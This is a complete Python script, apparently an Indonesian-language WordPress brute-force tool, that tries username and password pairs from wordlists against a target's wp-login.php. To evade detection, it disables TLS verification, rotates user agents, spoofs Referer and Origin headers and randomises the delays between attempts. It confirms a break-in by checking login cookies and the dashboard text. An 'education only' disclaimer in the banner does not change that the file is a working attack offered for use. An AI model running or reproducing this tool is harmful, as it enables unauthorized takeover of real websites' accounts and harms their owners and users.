import requests
import time
import random
import urllib3
import argparse
from requests.exceptions import RequestException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =====================[ BANNER TOOLS ]=====================
def banner():
    print(r"""

 _    _____________            _    __   __                
| |  | | ___ \ ___ \          | |   \ \ / /                
| |  | | |_/ / |_/ /_ __ _   _| |_ __\ V /___   __ _  __ _ 
| |/\| |  __/| ___ \ '__| | | | __/ _ \ // _ \ / _` |/ _` |
\  /\  / |   | |_/ / |  | |_| | ||  __/ | (_) | (_| | (_| |
 \/  \/\_|   \____/|_|   \__,_|\__\___\_/\___/ \__, |\__,_|
                                                __/ |      
                                               |___/       

          WordPress Brute Force & Auth Bypass Tool
              Created by: @YogaGymn
           Instagram: @YogaGymn | Cilacap | 2025

    [!] Tools ini hanya digunakan untuk tujuan edukasi!
        Developer tidak bertanggung jawab atas penyalahgunaan.
    """)
# ==========================================================

# Fungsi untuk muat daftar username/password
def load_list(file_path):
    with open(file_path, "r") as file:
        return [line.strip() for line in file.readlines()]

# User-agent acak untuk mimikri lebih baik
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
]

def try_login(user, pw, login_url, dashboard_url):
    session = requests.Session()
    session.headers.update({
        "User-Agent": random.choice(user_agents),
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": login_url,
        "Origin": login_url.rsplit("/", 1)[0],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    })
    session.cookies.set('wordpress_test_cookie', 'WP Cookie check')

    data = {
        "log": user,
        "pwd": pw,
        "wp-submit": "Log Masuk",
        "redirect_to": dashboard_url,
        "testcookie": "1"
    }

    for attempt in range(3):
        try:
            response = session.post(login_url, data=data, verify=False, allow_redirects=True, timeout=15)
            cookies = session.cookies.get_dict()

            if "wordpress_logged_in" in cookies or "wp-admin" in response.url:
                dash_response = session.get(dashboard_url, verify=False)
                if any(word in dash_response.text.lower() for word in ["dashboard", "keluar", "selamat datang", "beranda", "menu-dashboard"]):
                    print(f"[✓] LOGIN BERHASIL & DASHBOARD DIAKSES: {user} / {pw}")
                    return True
                else:
                    print(f"[!] Login mungkin berhasil tapi dashboard tidak bisa diakses. Cek manual: {user} / {pw}")
                    return True
            elif "salah" in response.text.lower():
                print(f"[-] Gagal: {user} / {pw} -> Password salah")
            elif "Nama pengguna" in response.text:
                print(f"[-] Gagal: {user} / {pw} -> Username tidak valid")
            else:
                print(f"[?] {user} / {pw} -> Tidak diketahui (Status {response.status_code})")
            break
        except RequestException as e:
            print(f"[!] Percobaan {attempt+1}: Error koneksi untuk {user} / {pw} => {e}")
            time.sleep(5)
    return False

def main():
    banner()

    parser = argparse.ArgumentParser(description="WordPress Brute Force Login Tool by Prayoga Gymnastiar")
    parser.add_argument("-u", "--url", required=True, help="URL login WordPress (contoh: https://target.com/wp-login.php)")
    parser.add_argument("-d", "--dashboard", required=False, help="URL dashboard wp-admin (default: <url_base>/wp-admin/)")
    parser.add_argument("--userlist", default="userlist.txt", help="File berisi daftar username")
    parser.add_argument("--passlist", default="passlist.txt", help="File berisi daftar password")

    args = parser.parse_args()

    base_url = args.url.rsplit("/", 1)[0]
    dashboard_url = args.dashboard if args.dashboard else base_url + "/wp-admin/"

    usernames = load_list(args.userlist)
    passwords = load_list(args.passlist)

    for user in usernames:
        for pw in passwords:
            if try_login(user, pw, args.url, dashboard_url):
                return
            delay = random.uniform(10, 20)
            print(f"[i] Menunggu selama {delay:.2f} detik sebelum mencoba lagi...")
            time.sleep(delay)

if __name__ == "__main__":
    main()
